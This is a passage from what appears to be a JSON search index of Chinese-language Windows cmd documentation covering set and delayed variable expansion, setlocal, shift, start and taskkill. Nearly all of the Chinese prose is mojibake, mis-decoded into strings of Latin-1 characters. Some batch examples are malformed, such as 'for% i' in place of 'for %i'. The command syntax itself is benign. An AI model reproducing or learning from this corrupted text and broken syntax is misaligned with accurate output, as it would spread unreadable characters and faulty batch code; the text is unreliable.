å¯ä»¥ä½¿ç”¨ç¯å¢ƒå˜é‡å€¼åšè®¡ç®—è€Œä¸ç”¨é”®å…¥é‚£äº› % ç¬¦å·æ¥å¾—åˆ°å®ƒä»¬çš„å€¼ã€‚ å¦‚æœ SET /A åœ¨å‘½ä»¤è„šæœ¬å¤–çš„å‘½ä»¤è¡Œæ‰§è¡Œçš„ï¼Œé‚£ä¹ˆå®ƒæ˜¾ç¤ºè¯¥è¡¨è¾¾å¼çš„æœ€åå€¼ã€‚ è¯¥åˆ†é…çš„æ“ä½œç¬¦åœ¨åˆ†é…çš„æ“ä½œç¬¦å·¦è¾¹éœ€è¦ä¸€ä¸ªç¯å¢ƒå˜é‡åç§°ã€‚ é™¤åå…­è¿›åˆ¶æœ‰ 0x å‰ç¼€ï¼Œå…«è¿›åˆ¶æœ‰ 0 å‰ç¼€çš„ï¼Œæ•°å­—å€¼ä¸ºåè¿›ä½æ•°å­—ã€‚ å› æ­¤ï¼Œ0x12 ä¸ 18 å’Œ 022ç›¸åŒã€‚è¯·æ³¨æ„å…«è¿›åˆ¶å…¬å¼å¯èƒ½å¾ˆå®¹æ˜“ææ··: 08 å’Œ 09 æ˜¯æ— æ•ˆçš„æ•°å­—ï¼Œ å› ä¸º 8 å’Œ 9 ä¸æ˜¯æœ‰æ•ˆçš„å…«è¿›åˆ¶ä½æ•°ã€‚(& ) /P å‘½ä»¤è¡Œå¼€å…³å…è®¸å°†å˜é‡æ•°å€¼è®¾æˆç”¨æˆ·è¾“å…¥çš„ä¸€è¡Œè¾“å…¥ã€‚è¯»å–è¾“å…¥ è¡Œä¹‹å‰ï¼Œæ˜¾ç¤ºæŒ‡å®šçš„ promptStringã€‚promptString å¯ä»¥æ˜¯ç©ºçš„ã€‚ å˜é‡å±€éƒ¨æ›¿æ¢åŠå…¶ä»– å­—ç¬¦ä¸²æ›¿æ¢ ç¯å¢ƒå˜é‡æ›¿æ¢(å³å­—ç¬¦ä¸²æ›¿æ¢)å·²å¦‚ä¸‹å¢å¼º: %PATH:str1=str2% ä¼šæ‰©å±• PATH ç¯å¢ƒå˜é‡ï¼Œç”¨ \"str2\" ä»£æ›¿æ‰©å±•ç»“æœä¸­çš„æ¯ä¸ª \"str1\"ã€‚ è¦æœ‰æ•ˆåœ°ä»æ‰©å±•ç»“æœä¸­åˆ é™¤æ‰€æœ‰çš„ \"str1\"ï¼Œ\"str2\" å¯ä»¥æ˜¯ç©ºçš„ã€‚ \"str1\" å¯ä»¥ä»¥æ˜Ÿå·æ‰“å¤´ï¼›åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œ\"str1\" ä¼šä»æ‰©å±•ç»“æœçš„å¼€å§‹åˆ° str1 å‰©ä½™éƒ¨åˆ†ç¬¬ä¸€æ¬¡å‡ºç°çš„åœ°æ–¹ï¼Œéƒ½ä¸€ç›´ä¿æŒç›¸é…ã€‚ å­—ç¬¦ä¸²æå– ä¹Ÿå¯ä»¥ä¸ºæ‰©å±•åæŒ‡å®šå­å­—ç¬¦ä¸²(å³æå–å­—ç¬¦ä¸²): %PATH:~10,5% ä¼šæ‰©å±• PATH ç¯å¢ƒå˜é‡ï¼Œç„¶ååªä½¿ç”¨åœ¨æ‰©å±•ç»“æœä¸­ä»ç¬¬ 11 ä¸ª(åç§»é‡ 10)å­—ç¬¦å¼€å§‹çš„äº”ä¸ªå­—ç¬¦ã€‚ å¦‚æœæ²¡æœ‰æŒ‡å®šé•¿åº¦ï¼Œåˆ™é‡‡ç”¨é»˜è®¤å€¼ï¼Œå³å˜é‡æ•°å€¼çš„ä½™æ•°ã€‚ å¦‚æœä¸¤ä¸ªæ•°å­—(åç§»é‡å’Œé•¿åº¦)éƒ½æ˜¯è´Ÿæ•°ï¼Œä½¿ç”¨çš„æ•°å­—åˆ™æ˜¯ç¯å¢ƒå˜é‡æ•°å€¼é•¿åº¦åŠ ä¸ŠæŒ‡å®šçš„åç§»é‡æˆ–é•¿åº¦. æå– PATH å˜é‡çš„æœ€ååä¸ªå­—ç¬¦: %PATH:~-10% æå– PATH å˜é‡çš„æ‰€æœ‰å­—ç¬¦ï¼Œé™¤äº†æœ€åä¸¤ä¸ª: %PATH:~0,-2% å»¶è¿Ÿç¯å¢ƒå˜é‡æ‹“å±•ç›¸å…³ å¦‚ä½•æ·»åŠ ? setlocal ENABLEDELAYEDEXPANSION ç„¶ååé¢å˜é‡åŠ æ„Ÿå¹å·å³å¯. è¯¦æƒ…è§: /docs/æ“ä½œç³»ç»Ÿ/windows/windows_shell/setlocal å»¶è¿Ÿç¯å¢ƒå˜é‡æ‰©å……çš„æ”¯æŒã€‚è¯¥æ”¯æŒæ€»æ˜¯æŒ‰é»˜è®¤å€¼è¢«åœç”¨ï¼Œä½†ä¹Ÿå¯ä»¥é€šè¿‡ CMD.EXE çš„ /V å‘½ä»¤è¡Œå¼€å…³è€Œè¢«å¯ç”¨/åœç”¨ã€‚è¯·å‚é˜… CMD /? è€ƒè™‘åˆ°è¯»å–ä¸€è¡Œæ–‡æœ¬æ—¶æ‰€é‡åˆ°çš„ç›®å‰æ‰©å……çš„é™åˆ¶æ—¶ï¼Œå»¶è¿Ÿç¯å¢ƒå˜é‡æ‰©å……æ˜¯å¾ˆæœ‰ç”¨çš„ï¼Œè€Œä¸æ˜¯æ‰§è¡Œçš„æ—¶å€™ã€‚ ä»¥ä¸‹ä¾‹å­è¯´æ˜ç›´æ¥å˜é‡æ‰©å……çš„é—®é¢˜: set VAR=before if \"%VAR%\" == \"before\" ( set VAR=after if \"%VAR%\" == \"after\" @echo If you see this, it worked ) ä¸ä¼šæ˜¾ç¤ºæ¶ˆæ¯ï¼Œå› ä¸º %VAR% çš„å€¼ä¼šè¢«é¢„å…ˆæ›¿æ¢æ‰. å³: C:\\Users\\çƒŸé›€\\Desktop\\some\\t\\_>3.bat set VAR=before if \"before\" == \"before\" ( set VAR=after if \"before\" == \"after\" ) å› ä¸ºåœ¨ 'é¢„ç¼–è¯‘'(å¯¹è¿™ä¸ªä¸ç†Ÿ, æš‚ä¸”è¿™æ ·å®šä¹‰)æ—¶å€™ï¼Œä¸¤ä¸ª if è¯­å¥ä¸­çš„ %VAR% ä¼šè¢«ä»£æ›¿ï¼› å› ä¸º æœ€å¤–éƒ¨çš„ if æ˜¯ä¸€ä¸ªå¤åˆè¯­å¥, æ‰€ä»¥ï¼Œå¤åˆè¯­å¥ä¸­çš„ if(ç¬¬äºŒä¸ªif) å®é™…ä¸Šæ˜¯åœ¨æ¯”è¾ƒ \"before\"å’Œ\"after\"ï¼Œè¿™ä¸¤è€…æ°¸è¿œä¸ä¼šç›¸ç­‰ã€‚ åŒæ ·ï¼Œä»¥ä¸‹è¿™ä¸ªä¾‹å­ä¹Ÿä¸ä¼šè¾¾åˆ°é¢„æœŸæ•ˆæœ: set LIST= for% i in (*) do set LIST=%LIST%%i echo%LIST% åŸå› æ˜¯ï¼Œå®ƒä¸ä¼šåœ¨ç›®å‰çš„ç›®å½•ä¸­å»ºç«‹ä¸€ä¸ªæ–‡ä»¶åˆ—è¡¨ï¼Œè€Œåªæ˜¯å°†LIST å˜é‡è®¾æˆæ‰¾åˆ°çš„æœ€åä¸€ä¸ªæ–‡ä»¶ã€‚ è¿™ä¹Ÿæ˜¯å› ä¸º %LIST% åœ¨ FOR è¯­å¥è¢«è¯»å–æ—¶ï¼Œåªè¢«æ‰©å……äº†ä¸€æ¬¡ï¼› è€Œä¸”ï¼Œé‚£æ—¶çš„ LIST å˜é‡æ˜¯ç©ºçš„ã€‚ å› æ­¤ï¼Œæˆ‘ä»¬çœŸæ­£æ‰§è¡Œçš„ FOR å¾ªç¯æ˜¯: for% i in (*) do set LIST= %i è¿™ä¸ªå¾ªç¯ç»§ç»­å°† LIST è®¾æˆæ‰¾åˆ°çš„æœ€åä¸€ä¸ªæ–‡ä»¶ã€‚ å»¶è¿Ÿç¯å¢ƒå˜é‡æ‰©å……å…è®¸ä½ ä½¿ç”¨ä¸€ä¸ªä¸åŒçš„å­—ç¬¦(æƒŠå¹å·)åœ¨æ‰§è¡Œæ—¶é—´æ‰©å……ç¯å¢ƒå˜é‡ã€‚ å¦‚æœå»¶è¿Ÿçš„å˜é‡æ‰©å……è¢«å¯ç”¨ï¼Œå¯ä»¥å°†ä¸Šé¢ä¾‹å­å†™æˆä»¥ä¸‹æ‰€ç¤ºï¼Œä»¥è¾¾åˆ°é¢„æœŸæ•ˆæœ: set VAR=before if \"%VAR%\" == \"before\" ( set VAR=after if \"!VAR!\" == \"after\" @echo If you see this, it worked ) set LIST= for% i in (*) do set LIST=!LIST! %i echo %LIST% å¦‚æœå‘½ä»¤æ‰©å±•è¢«å¯ç”¨ï¼Œæœ‰å‡ ä¸ªåŠ¨æ€ç¯å¢ƒå˜é‡å¯ä»¥è¢«æ‰©å±•ï¼Œä½†ä¸ä¼šå‡ºç°åœ¨ SET æ˜¾ç¤ºçš„å˜ é‡åˆ—è¡¨ä¸­ã€‚æ¯æ¬¡å˜é‡æ•°å€¼è¢«æ‰©å±•æ—¶ï¼Œè¿™äº›å˜é‡æ•°å€¼éƒ½ä¼šè¢«åŠ¨æ€è®¡ç®—ã€‚å¦‚æœç”¨æˆ·ç”¨è¿™äº› åç§°ä¸­ä»»ä½•ä¸€ä¸ªæ˜ç¡®å®šä¹‰å˜é‡ï¼Œé‚£ä¸ªå®šä¹‰ä¼šæ›¿ä»£ä¸‹é¢æè¿°çš„åŠ¨æ€å®šä¹‰: %CD% - æ‰©å±•åˆ°å½“å‰ç›®å½•å­—ç¬¦ä¸²ã€‚ %DATE% - ç”¨è·Ÿ DATE å‘½ä»¤åŒæ ·çš„æ ¼å¼æ‰©å±•åˆ°å½“å‰æ—¥æœŸã€‚ %TIME% - ç”¨è·Ÿ TIME å‘½ä»¤åŒæ ·çš„æ ¼å¼æ‰©å±•åˆ°å½“å‰æ—¶é—´ã€‚ %RANDOM% - æ‰©å±•åˆ° 0 å’Œ 32767 ä¹‹é—´çš„ä»»æ„åè¿›åˆ¶æ•°å­—ã€‚ %ERRORLEVEL% - æ‰©å±•åˆ°å½“å‰ ERRORLEVEL æ•°å€¼ã€‚ %CMDEXTVERSION% - æ‰©å±•åˆ°å½“å‰å‘½ä»¤å¤„ç†å™¨æ‰©å±•ç‰ˆæœ¬å·ã€‚ %CMDCMDLINE% - æ‰©å±•åˆ°è°ƒç”¨å‘½ä»¤å¤„ç†å™¨çš„åŸå§‹å‘½ä»¤è¡Œã€‚ %HIGHESTNUMANODENUMBER% - æ‰©å±•åˆ°æ­¤è®¡ç®—æœºä¸Šçš„æœ€é«˜ NUMA èŠ‚ç‚¹å·ã€‚","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-Windows-windows_shell-set.html","loc":"/yq-doc-source-docs-operating-system-Windows-windows_shell-set.html"},{"title":"setlocal","text":"å¼€å§‹æ‰¹å¤„ç†æ–‡ä»¶ä¸­ç¯å¢ƒæ”¹åŠ¨çš„æœ¬åœ°åŒ–æ“ä½œã€‚åœ¨æ‰§è¡Œ SETLOCAL ä¹‹åæ‰€åšçš„ç¯å¢ƒæ”¹åŠ¨åªé™äºæ‰¹å¤„ç†æ–‡ä»¶ã€‚ è¦è¿˜åŸåŸå…ˆçš„è®¾ç½®ï¼Œå¿…é¡»æ‰§è¡Œ ENDLOCALã€‚ è¾¾åˆ°æ‰¹å¤„ç†æ–‡ä»¶ç»“å°¾æ—¶ï¼Œå¯¹äºè¯¥æ‰¹å¤„ç†æ–‡ä»¶çš„æ¯ä¸ªå°šæœªæ‰§è¡Œçš„ SETLOCAL å‘½ä»¤ï¼Œéƒ½ä¼šæœ‰ä¸€ä¸ªéšå«çš„ ENDLOCAL è¢«æ‰§è¡Œã€‚ SETLOCAL å¦‚æœå¯ç”¨å‘½ä»¤æ‰©å±•ï¼Œåˆ™ SETLOCAL æ›´æ”¹å¦‚ä¸‹: SETLOCAL æ‰¹å‘½ä»¤ç°åœ¨å¯ä»¥æ¥å—å¯é€‰å‚æ•°: ENABLEEXTENSIONS / DISABLEEXTENSIONS å¯ç”¨æˆ–ç¦ç”¨å‘½ä»¤å¤„ç†å™¨æ‰©å±•ã€‚è¿™äº› å‚æ•°æ¯” CMD /E:ON æˆ– /E:OFF å¼€å…³æœ‰ä¼˜å…ˆæƒã€‚è¯·å‚é˜… CMD /? è·å–è¯¦ç»†ä¿¡æ¯ã€‚ ENABLEDELAYEDEXPANSION / DISABLEDELAYEDEXPANSION å¯ç”¨æˆ–ç¦ç”¨å»¶ç¼“ç¯å¢ƒå˜é‡ æ‰©å±•ã€‚è¿™äº›å‚æ•°æ¯” CMD /V:ON æˆ– /V:OFF å¼€å…³æœ‰ä¼˜å…ˆæƒã€‚è¯·å‚é˜… CMD /? è·å–è¯¦ç»†ä¿¡æ¯ã€‚ æ— è®ºåœ¨ SETLOCAL å‘½ä»¤ä¹‹å‰çš„è®¾ç½®æ˜¯ä»€ä¹ˆï¼Œè¿™äº›ä¿®æ”¹ä¼šä¸€ç›´ ç”Ÿæ•ˆï¼Œç›´åˆ°å‡ºç°ç›¸åº”çš„ ENDLOCAL å‘½ä»¤ã€‚ åœ¨ç»™å®šå‚æ•°çš„æƒ…å†µä¸‹ï¼Œ SETLOCAL å‘½ä»¤å°†è®¾ç½® ERRORLEVEL å€¼ã€‚å¦‚æœç»™å®šä¸¤ä¸ªæœ‰æ•ˆå‚æ•°ä¸­çš„ä¸€ä¸ªï¼Œå¦ä¸€ä¸ªæœªç»™å®šï¼Œ åˆ™è¯¥å€¼ä¸ºé›¶ã€‚ é€šè¿‡ä»¥ä¸‹æ–¹æ³•ï¼Œä½ å¯ä»¥åœ¨æ‰¹è„šæœ¬ä¸­ ä½¿ç”¨æ­¤é¡¹æ¥ç¡®å®šæ‰©å±•æ˜¯å¦å¯ç”¨: VERIFY OTHER 2>nul SETLOCAL ENABLEEXTENSIONS IF ERRORLEVEL 1 echo Unable to enable extensions æ­¤æ–¹æ³•ä¹‹æ‰€ä»¥æœ‰æ•ˆï¼Œæ˜¯å› ä¸ºåœ¨ CMD.EXE çš„æ—§ç‰ˆæœ¬ä¸Šï¼ŒSETLOCAL ä¸è®¾ç½® ERRORLEVEL å€¼ã€‚å¦‚æœå‚æ•°ä¸æ­£ç¡®ï¼ŒVERIFY å‘½ä»¤ä¼šå°† ERRORLEVEL å€¼åˆå§‹åŒ–ä¸ºéé›¶å€¼ã€‚","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-Windows-windows_shell-setlocal.html","loc":"/yq-doc-source-docs-operating-system-Windows-windows_shell-setlocal.html"},{"title":"shift","text":"æ›´æ”¹æ‰¹å¤„ç†æ–‡ä»¶ä¸­å¯æ›¿æ¢å‚æ•°çš„ä½ç½®: SHIFT [/n] å¦‚æœå‘½ä»¤æ‰©å±•è¢«å¯ç”¨ï¼ŒSHIFT å‘½ä»¤æ”¯æŒ/n å‘½ä»¤è¡Œå¼€å…³ï¼›è¯¥å‘½ä»¤è¡Œå¼€å…³å‘Šè¯‰å‘½ä»¤ä»ç¬¬ n ä¸ªå‚æ•°å¼€å§‹ç§»ä½ï¼› n ä»‹äºé›¶å’Œå…«ä¹‹é—´ã€‚ä¾‹å¦‚: SHIFT /2 ä¼šå°† %3 ç§»ä½åˆ° %2ï¼Œå°† %4 ç§»ä½åˆ° %3ï¼Œç­‰ç­‰ï¼›å¹¶ä¸”ä¸å½±å“ %0 å’Œ %1ã€‚","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-Windows-windows_shell-shift.html","loc":"/yq-doc-source-docs-operating-system-Windows-windows_shell-shift.html"},{"title":"start","text":"å¯åŠ¨ä¸€ä¸ªå•ç‹¬çš„çª—å£ä»¥è¿è¡ŒæŒ‡å®šçš„ç¨‹åºæˆ–å‘½ä»¤: START [\"title\"] [/D path] [/I] [/MIN] [/MAX] [/SEPARATE | /SHARED] [/LOW | /NORMAL | /HIGH | /REALTIME | /ABOVENORMAL | /BELOWNORMAL] [/NODE <NUMA node>] [/AFFINITY <hex affinity mask>] [/WAIT] [/B] [command/program] [parameters] é€‰é¡¹/å‚æ•°è¯´æ˜: \"title\" åœ¨çª—å£æ ‡é¢˜æ ä¸­æ˜¾ç¤ºçš„æ ‡é¢˜ã€‚ path å¯åŠ¨ç›®å½•ã€‚ B å¯åŠ¨åº”ç”¨ç¨‹åºï¼Œä½†ä¸åˆ›å»ºæ–°çª—å£ã€‚ åº”ç”¨ç¨‹åºå·²å¿½ç•¥ &#94;C å¤„ç†ã€‚é™¤éåº”ç”¨ç¨‹åº å¯ç”¨ &#94;C å¤„ç†ï¼Œå¦åˆ™ &#94;Break æ˜¯å”¯ä¸€å¯ä»¥ä¸­æ–­ è¯¥åº”ç”¨ç¨‹åºçš„æ–¹å¼ã€‚ I æ–°çš„ç¯å¢ƒå°†æ˜¯ä¼ é€’ ç»™ cmd.exe çš„åŸå§‹ç¯å¢ƒï¼Œè€Œä¸æ˜¯å½“å‰ç¯å¢ƒã€‚ MIN ä»¥æœ€å°åŒ–æ–¹å¼å¯åŠ¨çª—å£ã€‚ MAX ä»¥æœ€å¤§åŒ–æ–¹å¼å¯åŠ¨çª—å£ã€‚ SEPARATE åœ¨å•ç‹¬çš„å†…å­˜ç©ºé—´ä¸­å¯åŠ¨ 16 ä½ Windows ç¨‹åºã€‚ SHARED åœ¨å…±äº«å†…å­˜ç©ºé—´ä¸­å¯åŠ¨ 16 ä½ Windows ç¨‹åºã€‚ LOW åœ¨ IDLE ä¼˜å…ˆçº§ç±»ä¸­å¯åŠ¨åº”ç”¨ç¨‹åºã€‚ NORMAL åœ¨ NORMAL ä¼˜å…ˆçº§ç±»ä¸­å¯åŠ¨åº”ç”¨ç¨‹åºã€‚ HIGH åœ¨ HIGH ä¼˜å…ˆçº§ç±»ä¸­å¯åŠ¨åº”ç”¨ç¨‹åºã€‚ REALTIME åœ¨ REALTIME ä¼˜å…ˆçº§ç±»ä¸­å¯åŠ¨åº”ç”¨ç¨‹åºã€‚ ABOVENORMAL åœ¨ ABOVENORMAL ä¼˜å…ˆçº§ç±»ä¸­å¯åŠ¨åº”ç”¨ç¨‹åºã€‚ BELOWNORMAL åœ¨ BELOWNORMAL ä¼˜å…ˆçº§ç±»ä¸­å¯åŠ¨åº”ç”¨ç¨‹åºã€‚ NODE å°†é¦–é€‰éä¸€è‡´æ€§å†…å­˜ç»“æ„(NUMA)èŠ‚ç‚¹æŒ‡å®šä¸º åè¿›åˆ¶æ•´æ•°ã€‚ AFFINITY å°†å¤„ç†å™¨å…³è”æ©ç æŒ‡å®šä¸ºåå…­è¿›åˆ¶æ•°å­—ã€‚ è¿›ç¨‹è¢«é™åˆ¶åœ¨è¿™äº›å¤„ç†å™¨ä¸Šè¿è¡Œã€‚ å°† /AFFINITY å’Œ /NODE ç»“åˆä½¿ç”¨æ—¶ï¼Œä¼šå¯¹å…³è”æ©ç  è¿›è¡Œä¸åŒçš„è§£é‡Šã€‚æŒ‡å®šå…³è”æ©ç ï¼Œä»¥ä¾¿å°†é›¶ä½ä½œä¸ºèµ·å§‹ä½ç½®(å°±å¦‚å°† NUMA èŠ‚ç‚¹çš„å¤„ç†å™¨æ©ç å‘å³ç§»ä½ä¸€æ ·)ã€‚ è¿›ç¨‹è¢«é™åˆ¶åœ¨æŒ‡å®šå…³è”æ©ç å’Œ NUMA èŠ‚ç‚¹ä¹‹é—´çš„ é‚£äº›é€šç”¨å¤„ç†å™¨ä¸Šè¿è¡Œã€‚ å¦‚æœæ²¡æœ‰é€šç”¨å¤„ç†å™¨ï¼Œåˆ™è¿›ç¨‹è¢«é™åˆ¶åœ¨ æŒ‡å®šçš„ NUMA èŠ‚ç‚¹ä¸Šè¿è¡Œã€‚ WAIT å¯åŠ¨åº”ç”¨ç¨‹åºå¹¶ç­‰å¾…å®ƒç»ˆæ­¢ã€‚ command/program å¦‚æœå®ƒæ˜¯å†…éƒ¨ cmd å‘½ä»¤æˆ–æ‰¹æ–‡ä»¶ï¼Œåˆ™ è¯¥å‘½ä»¤å¤„ç†å™¨æ˜¯ä½¿ç”¨ cmd.exe çš„ /K å¼€å…³è¿è¡Œçš„ã€‚ è¿™è¡¨ç¤ºè¿è¡Œè¯¥å‘½ä»¤ä¹‹åï¼Œè¯¥çª—å£ å°†ä»ç„¶å­˜åœ¨ã€‚ å¦‚æœå®ƒä¸æ˜¯å†…éƒ¨ cmd å‘½ä»¤æˆ–æ‰¹æ–‡ä»¶ï¼Œåˆ™ å®ƒå°±æ˜¯ä¸€ä¸ªç¨‹åºï¼Œå¹¶å°†ä½œä¸ºä¸€ä¸ªçª—å£åŒ–åº”ç”¨ç¨‹åºæˆ– æ§åˆ¶å°åº”ç”¨ç¨‹åºè¿è¡Œã€‚ parameters è¿™äº›æ˜¯ä¼ é€’ç»™ command/program çš„å‚æ•°ã€‚ æ³¨æ„: åœ¨ 64 ä½å¹³å°ä¸Šä¸æ”¯æŒ SEPARATE å’Œ SHARED é€‰é¡¹ã€‚ é€šè¿‡æŒ‡å®š /NODEï¼Œå¯æŒ‰ç…§åˆ©ç”¨ NUMA ç³»ç»Ÿä¸­çš„å†…å­˜åŒºåŸŸçš„æ–¹å¼åˆ›å»ºè¿›ç¨‹ã€‚ ä¾‹å¦‚ï¼Œå¯ä»¥åˆ›å»ºä¸¤ä¸ªå®Œå…¨é€šè¿‡å…±äº«å†…å­˜äº’ç›¸é€šä¿¡çš„è¿›ç¨‹ä»¥å…±äº«ç›¸åŒçš„é¦–é€‰ NUMA èŠ‚ç‚¹ï¼Œä»è€Œæœ€å¤§é™åº¦åœ°å‡å°‘å†…å­˜å»¶è¿Ÿã€‚ åªè¦æœ‰å¯èƒ½ï¼Œå®ƒä»¬å°±ä¼šåˆ†é…æ¥è‡ªç›¸åŒ NUMA èŠ‚ç‚¹çš„å†…å­˜ï¼Œå¹¶ä¸”ä¼šåœ¨æŒ‡å®šèŠ‚ç‚¹ä¹‹å¤–çš„å¤„ç†å™¨ä¸Šè‡ªç”±è¿è¡Œ: start /NODE 1 application1.exe start /NODE 1 application2.exe è¿™ä¸¤ä¸ªè¿›ç¨‹å¯è¢«è¿›ä¸€æ­¥é™åˆ¶åœ¨ç›¸åŒ NUMA èŠ‚ç‚¹å†…çš„æŒ‡å®šå¤„ç†å™¨ä¸Šè¿è¡Œã€‚ åœ¨ä»¥ä¸‹ç¤ºä¾‹ä¸­ï¼Œapplication1 åœ¨èŠ‚ç‚¹çš„ä¸¤ä¸ªä½ä½å¤„ç†å™¨ä¸Šè¿è¡Œï¼Œè€Œ application2åœ¨è¯¥èŠ‚ç‚¹çš„å…¶åä¸¤ä¸ªå¤„ç†å™¨ä¸Šè¿è¡Œã€‚ è¯¥ç¤ºä¾‹å‡å®šæŒ‡å®šèŠ‚ç‚¹è‡³å°‘å…·æœ‰å››ä¸ªé€»è¾‘å¤„ç†å™¨ã€‚è¯·æ³¨æ„ï¼ŒèŠ‚ç‚¹å·å¯æ›´æ”¹ä¸ºè¯¥è®¡ç®—æœºçš„ä»»ä½•æœ‰æ•ˆèŠ‚ç‚¹å·ï¼Œè€Œæ— éœ€æ›´æ”¹å…³è”æ©ç : start /NODE 1 /AFFINITY 0x3 application1.exe start /NODE 1 /AFFINITY 0xc application2.exe å¦‚æœå‘½ä»¤æ‰©å±•è¢«å¯ç”¨ï¼Œé€šè¿‡å‘½ä»¤è¡Œæˆ– START å‘½ä»¤çš„å¤–éƒ¨å‘½ä»¤è°ƒç”¨ä¼šå¦‚ä¸‹æ”¹å˜: å°†æ–‡ä»¶åä½œä¸ºå‘½ä»¤é”®å…¥ï¼Œéå¯æ‰§è¡Œæ–‡ä»¶å¯ä»¥é€šè¿‡æ–‡ä»¶å…³è”è°ƒç”¨ã€‚ (ä¾‹å¦‚ï¼ŒWORD.DOC ä¼šè°ƒç”¨è·Ÿ .DOC æ–‡ä»¶æ‰©å±•åå…³è”çš„åº”ç”¨ç¨‹åº)ã€‚ å…³äºå¦‚ä½•ä»å‘½ä»¤è„šæœ¬å†…éƒ¨åˆ›å»ºè¿™äº›å…³è”ï¼Œè¯·å‚é˜… ASSOC å’Œ FTYPE å‘½ä»¤ã€‚ æ‰§è¡Œçš„åº”ç”¨ç¨‹åºæ˜¯ 32 ä½ GUI åº”ç”¨ç¨‹åºæ—¶ï¼ŒCMD.EXE ä¸ç­‰åº”ç”¨ç¨‹åºç»ˆæ­¢å°±è¿”å›å‘½ä»¤æç¤ºç¬¦ã€‚ å¦‚æœåœ¨å‘½ä»¤è„šæœ¬å†…æ‰§è¡Œï¼Œè¯¥æ–°è¡Œä¸ºåˆ™ä¸ä¼šå‘ç”Ÿã€‚ å¦‚æœæ‰§è¡Œçš„å‘½ä»¤è¡Œçš„ç¬¬ä¸€ä¸ªç¬¦å·æ˜¯ä¸å¸¦æ‰©å±•åæˆ–è·¯å¾„ä¿®é¥°ç¬¦çš„å­—ç¬¦ä¸² \"CMD\"ï¼Œ\"CMD\" ä¼šè¢« COMSPEC å˜é‡çš„æ•°å€¼æ‰€æ›¿æ¢ã€‚ è¿™é˜²æ­¢ä»å½“å‰ç›®å½•æå– CMD.EXEã€‚ å¦‚æœæ‰§è¡Œçš„å‘½ä»¤è¡Œçš„ç¬¬ä¸€ä¸ªç¬¦å·æ²¡æœ‰æ‰©å±•åï¼ŒCMD.EXE ä¼šä½¿ç”¨PATHEXT ç¯å¢ƒå˜é‡çš„æ•°å€¼æ¥å†³å®šè¦ä»¥ä»€ä¹ˆé¡ºåºå¯»æ‰¾å“ªäº›æ‰©å±•åã€‚ PATHEXT å˜é‡çš„é»˜è®¤å€¼æ˜¯: .COM;.EXE;.BAT;.CMD è¯·æ³¨æ„ï¼Œè¯¥è¯­æ³•è·Ÿ PATH å˜é‡çš„ä¸€æ ·ï¼Œåˆ†å·éš”å¼€ä¸åŒçš„å…ƒç´ ã€‚ æŸ¥æ‰¾å¯æ‰§è¡Œæ–‡ä»¶æ—¶ï¼Œå¦‚æœæ²¡æœ‰ç›¸é…çš„æ‰©å±•åï¼Œçœ‹ä¸€çœ‹è¯¥åç§°æ˜¯å¦ä¸ç›®å½•åç›¸é…ã€‚ å¦‚æœç¡®å®å¦‚æ­¤ï¼ŒSTART ä¼šåœ¨é‚£ä¸ªè·¯å¾„ä¸Šè°ƒç”¨Explorerã€‚ å¦‚æœä»å‘½ä»¤è¡Œæ‰§è¡Œï¼Œåˆ™ç­‰åŒäºå¯¹é‚£ä¸ªè·¯å¾„ä½œ CD /Dã€‚ æ‰¹å¤„ç†ä¸­è°ƒç”¨å¤–éƒ¨ç¨‹åºçš„å‘½ä»¤ï¼ˆè¯¥å¤–éƒ¨ç¨‹åºåœ¨æ–°çª—å£ä¸­è¿è¡Œï¼Œæ‰¹å¤„ç†ç¨‹åºç»§ç»­å¾€ä¸‹æ‰§è¡Œï¼Œä¸ç†ä¼šå¤–éƒ¨ç¨‹åºçš„è¿è¡ŒçŠ¶å†µï¼‰ï¼Œ å¦‚æœç›´æ¥è¿è¡Œå¤–éƒ¨ç¨‹åºåˆ™å¿…é¡»ç­‰å¤–éƒ¨ç¨‹åºå®Œæˆåæ‰ç»§ç»­æ‰§è¡Œå‰©ä¸‹çš„æŒ‡ä»¤ ä¾‹: start explorer d:\\ è°ƒç”¨å›¾å½¢ç•Œé¢æ‰“å¼€Dç›˜ æœ‰ä¸€ç±»ä¼¼æŒ‡ä»¤ call ä¸åŒºåˆ«, è§ /docs/æ“ä½œç³»ç»Ÿ/windows/windows_shell/call æ³¨æ„: æœ‰æ—¶å€™ä½¿ç”¨ start å¯åŠ¨æ—¶å€™æ— æ•ˆ: start \"C:\\user xx\\xx.bat\" æ˜¯å› ä¸ºæœ‰ä¸ª title å‚æ•°, è¿™æ—¶å€™åŠ ä¸ªç©ºæ ‡é¢˜å³å¯: start \"\" \"C:\\user xx\\xx.bat\"","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-Windows-windows_shell-start.html","loc":"/yq-doc-source-docs-operating-system-Windows-windows_shell-start.html"},{"title":"taskkill","text":"ç±»ä¼¼ linux çš„ kill ä½¿ç”¨è¯¥å·¥å…·æŒ‰ç…§è¿›ç¨‹ ID (PID) æˆ–æ˜ åƒåç§°ç»ˆæ­¢ä»»åŠ¡: TASKKILL [/S system [/U username [/P [password]]]] { [/FI filter] [/PID processid | /IM imagename] } [/T] [/F] å‚æ•°åˆ—è¡¨: /S system æŒ‡å®šè¦è¿æ¥çš„è¿œç¨‹ç³»ç»Ÿã€‚ /U [domain\\]user æŒ‡å®šåº”è¯¥åœ¨å“ªä¸ªç”¨æˆ·ä¸Šä¸‹æ–‡æ‰§è¡Œè¿™ä¸ªå‘½ä»¤ã€‚ /P [password] ä¸ºæä¾›çš„ç”¨æˆ·ä¸Šä¸‹æ–‡æŒ‡å®šå¯†ç ã€‚å¦‚æœå¿½ç•¥ï¼Œæç¤º è¾“å…¥ã€‚ /FI filter åº”ç”¨ç­›é€‰å™¨ä»¥é€‰æ‹©ä¸€ç»„ä»»åŠ¡ã€‚ å…è®¸ä½¿ç”¨ \"*\"ã€‚ä¾‹å¦‚ï¼Œæ˜ åƒåç§° eq acme* /PID processid æŒ‡å®šè¦ç»ˆæ­¢çš„è¿›ç¨‹çš„ PIDã€‚ ä½¿ç”¨ TaskList å–å¾— PIDã€‚ /IM imagename æŒ‡å®šè¦ç»ˆæ­¢çš„è¿›ç¨‹çš„æ˜ åƒåç§°ã€‚é€šé…ç¬¦ '*'å¯ç”¨æ¥ æŒ‡å®šæ‰€æœ‰ä»»åŠ¡æˆ–æ˜ åƒåç§°ã€‚ /T 